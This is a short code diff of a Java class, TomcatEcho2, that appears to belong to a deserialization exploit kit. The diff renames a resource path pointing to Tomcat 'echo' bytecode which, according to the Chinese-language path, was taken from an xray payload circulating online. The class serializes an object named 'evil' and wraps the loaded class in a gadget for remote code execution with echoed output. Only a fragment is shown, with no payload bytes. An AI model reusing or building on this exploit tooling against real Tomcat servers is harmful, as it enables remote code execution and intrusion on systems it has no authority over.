@@ -18,7 +18,7 @@ public class TomcatEcho2 {
         byte[] ser = Serializer.serialize(evil);
     }
     public Object getObject(Class gadget) throws Exception {
-        InputStream inputStream = TomcatEcho2.class.getClassLoader().getResourceAsStream("rce回显/根据网上流传的xary payload提取的tomcat回显字节码文件.class");
+        InputStream inputStream = TomcatEcho2.class.getClassLoader().getResourceAsStream("rce回显/xray.class.txt");
         byte[] bytes = IOUtils.toByteArray(inputStream);
         Class c = ClassFiles.bytesAsClass(bytes);
         Object o = new Eval().getObject(gadget,c);
